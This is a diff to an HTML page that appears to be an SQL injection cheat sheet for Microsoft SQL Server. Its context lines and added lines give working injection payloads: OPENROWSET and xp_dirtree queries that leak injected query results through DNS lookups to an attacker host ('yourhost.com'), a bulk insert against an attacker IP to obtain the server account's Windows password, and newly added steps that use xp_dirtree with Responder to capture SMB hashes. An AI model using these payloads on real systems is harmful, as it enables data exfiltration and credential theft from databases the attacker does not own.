@@ -26,11 +26,15 @@ This attack can help you to get SQL Server user's Windows password of target ser
 bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'<br/>
 Check out Bulk Insert Reference to understand how can you use bulk insert.<br/>
 <br/>
-Out of Band Channel Attacks<br/>
+<b>Out of Band Channel Attacks</b><br/>
 Makes DNS resolution request to {INJECT}.yourhost.com<br/>
 ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')<br/>
 <br/>
 Makes DNS resolution request to {INJECTION}.yourhost.com<br/>
 ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q<br/>
 <br/>
-{INJECTION} = You want to run the query.</body></html>
+{INJECTION} = You want to run the query.<br/>
+<br/>
+More than DNS though, &nbsp;xp_dirtree and responder to capture SMB hashes!<br/>
+responder listen for connections (even analyze is enough)<br/>
+exec xp_dirtree "\\&lt;LHOST&gt;\file.txt",0,1</body></html>
